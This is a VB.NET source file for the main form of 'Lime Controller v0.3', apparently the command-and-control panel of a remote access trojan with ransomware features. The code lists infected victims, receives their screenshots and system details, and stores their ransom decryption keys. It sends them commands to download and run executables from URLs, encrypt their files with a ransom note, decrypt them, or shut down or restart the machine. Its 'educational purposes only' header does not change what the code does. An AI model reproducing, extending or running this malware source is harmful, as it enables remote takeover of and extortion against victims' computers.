
'##################################################################
'##           N Y A N   C A T  ||  Last edit FEB/26/2018         ##
'##################################################################
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##            ░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░           ##
'##            ░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░           ##
'##            ░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░           ##
'##            ░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░           ##
'##            ░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░           ##
'##            ░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░           ##
'##            ░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░           ##
'##            ░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░           ##
'##            ░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░           ##
'##            ░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░           ##
'##            ░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░           ##
'##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
'##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
'##                                                              ##
'##                  .. Lime Controller v0.3 ..                  ##
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##################################################################
'##    This project was created for educational purposes only    ##
'##################################################################



Public Class Form1

    Public Shared F As Form1
    Public Shared SPL As String = "'L'"
    Public Shared LIST_ITEMS As New List(Of String)
    Public Myport As String = InputBox(" Hello " & Environment.UserName + vbNewLine + vbNewLine & " Please enter port", "PORT")
    Public cc As New CL


#Region "Events"

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            Control.CheckForIllegalCrossThreadCalls = False
            F = Me
            cc.Start(Myport)
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical, Nothing)
            End
        End Try

        If Not IO.Directory.Exists(Application.StartupPath + "\Stub") Then
            IO.Directory.CreateDirectory(Application.StartupPath + "\Stub")
        End If
    End Sub

    Private Sub Form1_Closing(sender As Object, e As System.ComponentModel.CancelEventArgs) Handles MyBase.Closing
        On Error Resume Next
        End
    End Sub

#End Region

#Region "receiving"
    Public Delegate Sub Delg(ByVal C As C, ByVal B() As Byte)
    Public Shared Sub Dt(ByVal C As C, ByVal B() As Byte)
        Dim A() As String = Strings.Split(FN.GS(B), SPL)
        'On Error Resume Next
        Select Case A(0)
            Case "INFO"

                Threading.Monitor.Enter(F.L1.Items)
                For I As Integer = 0 To A.Count - 1
                    LIST_ITEMS.Add(A(I))
                Next


                C.L = F.L1.Items.Add(LIST_ITEMS(1))
                C.L.SubItems.Add(C.ip)
                C.L.SubItems.Add(LIST_ITEMS(2))
                C.L.SubItems.Add(LIST_ITEMS(3))
                C.L.SubItems.Add(LIST_ITEMS(4))
                C.L.SubItems.Add(LIST_ITEMS(5))
                C.L.SubItems.Add(LIST_ITEMS(6))
                C.L.SubItems.Add(LIST_ITEMS(7))
                C.L.SubItems.Add(LIST_ITEMS(8))
                C.L.SubItems.Add(LIST_ITEMS(9))
                C.L.SubItems.Add(LIST_ITEMS(10))

                C.L.Tag = C
                LIST_ITEMS.Clear()
                Threading.Monitor.Exit(F.L1.Items)
                Fix()
                Return

            Case "MSG"
                For Each L As ListViewItem In F.L1.Items
                    If L.SubItems(1).Text = C.ip Then
                        F.L2.Items.Add(DateAndTime.Now.ToString("dd/MMM hh:mm tt") + "  " + L.SubItems(0).Text + "  " + L.SubItems(2).Text + "  -->>  " + A(1).ToString)
                        Exit For
                    End If
                Next

            Case "Details"

                F.ListView1.Columns.Add("")
                F.ListView1.Columns.Add("")
                F.ListView2.Columns.Add("")
                F.ListView2.Columns.Add("")

                F.ListView1.Items.Add("ID").SubItems.Add(A(1))
                F.ListView1.Items.Add("User").SubItems.Add(A(2))
                F.ListView1.Items.Add("Current Connection").SubItems.Add(A(11))
                F.ListView1.Items.Add("Stub").SubItems.Add(A(3))
                F.ListView1.Items.Add("CPU").SubItems.Add(A(4))
                F.ListView1.Items.Add("GPU").SubItems.Add(A(5))
                F.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                F.ListView2.Items.Add("Privilege").SubItems.Add(A(6))
                F.ListView2.Items.Add("Machine Type").SubItems.Add(A(7))
                F.ListView2.Items.Add("Current Time").SubItems.Add(A(8))
                F.ListView2.Items.Add("Drivers List").SubItems.Add(A(9))
                F.ListView2.Items.Add("Last reboot").SubItems.Add(A(10))
                F.ListView2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)

            Case "GET-PASS"
                If Not IO.Directory.Exists("Users" & "\" & A(1)) Then
                    IO.Directory.CreateDirectory("Users" & "\" & A(1))
                End If
                IO.File.WriteAllText("Users" & "\" & A(1) + "\" & "KEY.txt", A(2))

            Case "DEL-PASS"
                IO.File.Delete("Users" & "\" & A(1) + "\" & "KEY.txt")

            Case "c_ransome"
                C.L.SubItems(3).Text = A(1)
                Fix()
            Case "SC"
                Try
                    IO.File.WriteAllBytes("Users" & "\" & A(1) + "\" & "SC.jpeg", Convert.FromBase64String(A(2)))
                    Process.Start("Users" & "\" & A(1) + "\" & "SC.jpeg")
                Catch ex As Exception
                    MsgBox(ex.Message)
                End Try


        End Select

    End Sub
#End Region

#Region "Sending"

    Private Sub FromDiskToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FromDiskToolStripMenuItem1.Click

        Try
            Dim o As New OpenFileDialog
            With o
                .Filter = "All Type (*.*)|*.*"
                .Title = "Select a File"
            End With

            If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                For Each l As ListViewItem In Me.L1.SelectedItems
                    Dim C As C = CType(l.Tag, C)
                    C.SendText("RunDisk" & SPL & o.FileName & SPL & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
                Next
            End If
        Catch ex As Exception
        End Try

    End Sub


    Private Sub FromURLToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FromURLToolStripMenuItem1.Click
        Try
            Dim URL As String = InputBox("Enter the direct link", "Run File", "http://site.com/file.exe")
            If String.IsNullOrEmpty(URL) Then
                Exit Sub
            Else
                For Each l As ListViewItem In Me.L1.SelectedItems
                    Dim C As C = CType(l.Tag, C)
                    C.SendText("RunURL" & SPL & URL)
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub FromDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromDiskToolStripMenuItem.Click
        Try
            Dim o As New OpenFileDialog
            With o
                .Filter = ".exe (*.exe)|*.exe"
                .Title = "UPDATE"
            End With

            If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                For Each l As ListViewItem In Me.L1.SelectedItems
                    Dim C As C = CType(l.Tag, C)
                    C.SendText("RunDisk" & SPL & o.FileName & SPL & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)) & SPL & "update")
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub FromURLToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromURLToolStripMenuItem.Click
        Try
            Dim URL As String = InputBox("Enter the direct link", "UPDATE", "http://site.com/file.exe")
            If String.IsNullOrEmpty(URL) Then

                Exit Sub
            Else
                For Each l As ListViewItem In Me.L1.SelectedItems
                    Dim C As C = CType(l.Tag, C)
                    C.SendText("RunURL" & SPL & URL & SPL & "update")
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub RestartToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RestartToolStripMenuItem1.Click
        For Each l As ListViewItem In Me.L1.SelectedItems
            Dim C As C = CType(l.Tag, C)
            C.SendText("Reconnect")
        Next
    End Sub

    Private Sub UninstallToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UninstallToolStripMenuItem1.Click
        For Each l As ListViewItem In Me.L1.SelectedItems
            Dim C As C = CType(l.Tag, C)
            C.SendText("Uni")
        Next
    End Sub

    Private Sub CloseToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CloseToolStripMenuItem.Click
        For Each l As ListViewItem In Me.L1.SelectedItems
            Dim C As C = CType(l.Tag, C)
            C.SendText("Close")
        Next
    End Sub

    Private Sub LogoffToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles LogoffToolStripMenuItem.Click
        For Each l As ListViewItem In Me.L1.SelectedItems
            Dim C As C = CType(l.Tag, C)
            C.SendText("Logoff")
        Next
    End Sub

    Private Sub ToolStripMenuItem3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem3.Click
        For Each l As ListViewItem In Me.L1.SelectedItems
            Dim C As C = CType(l.Tag, C)
            C.SendText("Restart")
        Next
    End Sub

    Private Sub ShutdownToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ShutdownToolStripMenuItem.Click
        For Each l As ListViewItem In Me.L1.SelectedItems
            Dim C As C = CType(l.Tag, C)
            C.SendText("Shutdown")
        Next
    End Sub

    Private Sub EncryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EncryptToolStripMenuItem.Click
        Try
            Dim R As New Ransomware
            R.ShowDialog()

            If R.OK = True Then

                For Each l As ListViewItem In Me.L1.SelectedItems
                    Dim C As C = CType(l.Tag, C)
                    C.SendText("Ransom" + SPL + R.RichTextBox1.Text + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(R.o.FileName)))

                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub DecryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DecryptToolStripMenuItem.Click
        Try
            For Each l As ListViewItem In Me.L1.SelectedItems
                Dim C As C = CType(l.Tag, C)
                C.SendText("Ransom-DEC" + SPL + IO.File.ReadAllText("USERS" + "\" + C.L.SubItems(0).Text + "\Key.txt"))
            Next
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try

    End Sub


#End Region

#Region "Theme"
    Private Shared Sub Fix()
        F.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
    End Sub

    Private Sub ListView1_Resize(sender As Object, e As EventArgs)
        Fix()
    End Sub

    Public Function KeyCount()
        Try
            Dim Location = Application.StartupPath + "\Users"
            Dim fileEntries As String() = IO.Directory.GetFiles(Location, "KEY.txt", IO.SearchOption.AllDirectories)
            Return fileEntries.Count
        Catch ex As Exception
            Return "0"
        End Try
    End Function

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Me.ToolStripStatusLabel1.Text = "LISTENING PORT [" & Myport & "]        ONLINE CLIENTS [" & L1.Items.Count & "]        SELECTED CLIENTS [" & L1.SelectedItems.Count & "]        AVAILABLE KEYS TO DECRYPT [" & KeyCount() & "]"
    End Sub

    Private Sub Form1_Activated(sender As Object, e As EventArgs) Handles Me.Activated
        Opacity = 1
    End Sub

    Private Sub Form1_Deactivate(sender As Object, e As EventArgs) Handles Me.Deactivate
        Opacity = 0.8
    End Sub

    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
        MsgBox("Coded by : NYAN CAT")
    End Sub

    Private Sub BuilderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BuilderToolStripMenuItem.Click
        Builder.Show()
    End Sub

    Private Sub L1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles L1.SelectedIndexChanged

        Dim x As Integer

        Try
            Dim C As C = CType(L1.SelectedItems(x).Tag, C)
            C.SendText("Details")

        Catch ex As Exception
            F.ListView1.Clear()
            F.ListView2.Clear()
        End Try


        Try
            If L1.SelectedItems.Count > 0 Then
                For x = 0 To L1.SelectedItems.Count - 1
                    PictureBox1.ImageLocation = "Users" & "\" & L1.SelectedItems(x).Text + "\" & "SC.jpeg"
                    PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage
                    PictureBox1.Visible = True
                Next
            Else
                PictureBox1.Visible = False
            End If
        Catch ex As Exception
            PictureBox1.Visible = False
        End Try


    End Sub

#End Region



End Class
